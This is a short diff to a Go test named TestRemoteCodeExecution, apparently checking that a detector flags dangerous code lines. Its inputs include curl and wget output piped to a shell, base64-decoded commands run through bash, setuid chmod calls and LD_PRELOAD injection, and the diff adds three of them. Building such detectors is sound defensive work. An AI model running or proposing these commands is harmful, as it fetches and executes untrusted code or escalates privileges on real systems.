@@ -235,6 +235,9 @@ func TestRemoteCodeExecution(t *testing.T) {
 		`chmod 4755 /usr/bin/thing`,
 		`chmod 2755 /usr/bin/x`,
 		`subprocess.run(["bash", "-c", "curl -fsSL https://x/i.sh | sh"])`,
+		`subprocess.Popen(["sh", "-c", "wget -qO- https://x/i.sh | sh"])`,
+		`subprocess.call(["bash", "-c", "echo aGk= | base64 -d | sh"])`,
+		`subprocess.run(["bash", "-c", base64.b64decode(blob).decode()])`,
 		`export LD_PRELOAD=/tmp/x.so`,
 	}
 	for _, line := range trip {
